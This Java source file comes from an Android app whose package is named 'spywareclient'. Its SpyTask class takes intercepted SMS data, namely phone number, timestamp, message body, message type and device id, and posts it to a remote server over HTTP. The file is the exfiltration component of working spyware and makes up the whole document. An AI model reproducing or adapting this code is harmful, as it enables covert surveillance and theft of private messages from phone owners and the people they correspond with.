package com.hoangdv.spywareclient.Spy;

import java.util.HashMap;
import java.util.Map;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request.Method;
import com.android.volley.Response.ErrorListener;
import com.android.volley.Response.Listener;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.hoangdv.spywareclient.AppController;

public class SpyTask extends AsyncTask<SmsInfo, Void, Void> {

	private Context context;

	@Override
	protected Void doInBackground(SmsInfo... params) {
		final SmsInfo smsInfo = params[0];
		try {
			StringRequest request = new StringRequest(Method.POST,
					StatusConfig.URL_SERVER, new Listener<String>() {
						@Override
						public void onResponse(String arg0) {
							// TODO Auto-generated method stub
							arg0 = arg0.replace("\\", "").replace("\"{", "{")
									.replace("}\"", "}");
							try {
								JSONObject jsonObject = new JSONObject(arg0);
								Log.d("Json", jsonObject.getString("message"));
							} catch (JSONException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
							Log.d("send2server", arg0);
							Toast.makeText(context, "Success: "+arg0.toString(),
									Toast.LENGTH_SHORT).show();
						}
					}, new ErrorListener() {
						@Override
						public void onErrorResponse(VolleyError arg0) {
							// TODO Auto-generated method stub
							Log.e("send2server", arg0.toString());
							Toast.makeText(context, arg0.toString(),
									Toast.LENGTH_SHORT).show();
						}
					}) {
				@Override
				protected Map<String, String> getParams()
						throws AuthFailureError {
					Map<String, String> map = new HashMap<String, String>();
					map.put("FK_iDeviceId", StatusConfig.idDevice + "");
					map.put("sPhoneNumber", smsInfo.getPhoneNumber());
					map.put("tTime", smsInfo.getTimeStamp());
					map.put("sBody", smsInfo.getBodySms());
					map.put("bType", smsInfo.getbType());
					return map;
				}
			};
			int socketTimeout = 30000;// 30 seconds - change to what you want
			RetryPolicy policy = new DefaultRetryPolicy(socketTimeout,
					DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
					DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
			request.setRetryPolicy(policy);
			AppController.getInstance().addToRequestQueue(request);
		} catch (Exception ex) {

		}

		return null;
	}

	public Context getContext() {
		return context;
	}

	public void setContext(Context context) {
		this.context = context;
	}

}
